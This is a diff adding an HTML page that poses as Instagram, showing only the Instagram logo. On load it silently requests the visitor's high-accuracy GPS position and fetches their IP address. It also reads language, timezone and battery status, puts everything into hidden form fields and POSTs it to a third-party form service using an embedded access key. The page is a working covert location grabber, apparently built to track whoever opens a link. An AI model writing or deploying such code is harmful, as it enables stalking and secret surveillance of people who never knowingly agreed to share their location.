@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Accurate Geolocation</title>
+    <script>
+        function fetchIP(callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://api.ipify.org?format=json", true);
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    callback(response.ip);
+                } else {
+                    console.error("Error fetching IP address.");
+                    callback("unknown_ip");
+                }
+            };
+            xhr.send();
+        }
+
+        function showPosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var accuracy = position.coords.accuracy; // Accuracy in meters
+
+            // Set the values of hidden inputs
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
+            document.getElementById("accuracy").value = accuracy;
+
+            // Generate Google Maps URL for embedding in an iframe
+            var mapURL = `https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
+
+            // Set the map URL as a hidden input value
+            document.getElementById("map_url").value = mapURL;
+
+            // Update the iframe src to display the map
+            document.getElementById('map').src = mapURL;
+
+            // Fetch the IP address
+            fetchIP(function(ipAddress) {
+                document.getElementById("ip_address").value = ipAddress;
+
+                // Collect additional information
+                var language = navigator.language || navigator.userLanguage;
+                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                document.getElementById("language").value = language;
+                document.getElementById("timezone").value = timezone;
+
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        var batteryLevel = battery.level * 100;
+                        var isCharging = battery.charging;
+                        document.getElementById("battery_level").value = batteryLevel;
+                        document.getElementById("battery_charging").value = isCharging;
+
+                        // Create an AJAX request to submit the form
+                        var xhr = new XMLHttpRequest();
+                        var formData = new FormData(document.getElementById("geolocationForm"));
+
+                        xhr.open("POST", "https://api.web3forms.com/submit", true);
+                        xhr.onload = function() {
+                            if (xhr.status === 200) {
+                                console.log("Geolocation data submitted successfully.");
+                            } else {
+                                console.error("Error submitting geolocation data.");
+                            }
+                        };
+                        xhr.send(formData);
+                    });
+                } else {
+                    console.warn("Battery Status API is not supported.");
+                }
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    console.error("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    console.error("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    console.error("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    console.error("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true, // Request high-accuracy data
+                    timeout: 15000, // Set timeout to 15 seconds
+                    maximumAge: 0 // No cached data
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Automatically get location and submit data when the page loads
+        window.onload = function() {
+            getLocation();
+        };
+    </script>
+</head>
+<body>
+    <h1><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" width="500" height="500"></h1>
+
+    <form id="geolocationForm">
+        <!-- Replace with your Access Key -->
+        <input type="hidden" name="access_key" value="4e498833-8707-46a2-b4ee-fc974bf1f7ca">
+
+        <!-- Hidden fields for geolocation data -->
+        <input type="hidden" id="latitude" name="latitude">
+        <input type="hidden" id="longitude" name="longitude">
+        <input type="hidden" id="accuracy" name="accuracy">
+        <input type="hidden" id="map_url" name="map_url">
+        
+        <!-- Hidden fields for additional data -->
+        <input type="hidden" id="ip_address" name="ip_address">
+        <input type="hidden" id="language" name="language">
+        <input type="hidden" id="timezone" name="timezone">
+        <input type="hidden" id="battery_level" name="battery_level">
+        <input type="hidden" id="battery_charging" name="battery_charging">
+
+        <!-- Honeypot Spam Protection -->
+        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
+        <!-- Custom Confirmation / Success Page -->
+        <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
+    </form>
+
+    <!-- Map Display -->
+    <iframe id="map" width="600" height="450" frameborder="0" style="border:0" allowfullscreen></iframe>
+</body>
+</html>
